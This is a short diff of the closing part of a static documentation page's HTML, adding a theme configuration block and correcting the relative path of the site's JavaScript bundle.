+      <script id="__config" type="application/json">{"annotate":null,"base":"../../../..","features":["announce.dismiss","content.code.annotate","content.code.copy","content.code.select","content.footnote.tooltips","content.tabs.link","content.tooltips","navigation.footer","navigation.indexes","navigation.instant","navigation.instant.prefetch","navigation.path","navigation.sections","navigation.top","navigation.tracking","search.highlight"],"search":"../../../../assets/javascripts/workers/search.5e1f2129.min.js","tags":null,"translations":{"clipboard.copied":"Copied to clipboard","clipboard.copy":"Copy to clipboard","search.result.more.one":"1 more on this page","search.result.more.other":"# more on this page","search.result.none":"No matching documents","search.result.one":"1 matching document","search.result.other":"# matching documents","search.result.placeholder":"Type to start searching","search.result.term.missing":"Missing","select.version":"Select version"},"version":null}</script>
     
     
-      <script src="assets/javascripts/bundle.1193bd74.min.js"></script>
+      <script src="../../../../assets/javascripts/bundle.1193bd74.min.js"></script>
       
     
   </body>
